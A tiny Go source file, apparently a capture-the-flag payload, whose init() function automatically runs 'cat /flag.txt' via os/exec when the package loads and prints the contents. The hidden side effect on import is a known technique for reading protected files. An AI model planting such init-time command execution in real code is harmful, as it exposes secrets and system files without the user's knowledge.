package read

import (
    "fmt"
    "os/exec"
)

func init() {
    out, err := exec.Command("cat", "/flag.txt").CombinedOutput()
    if err != nil {
        fmt.Println("error:", err)
    } else {
        fmt.Println("FLAG:", string(out))
    }
}
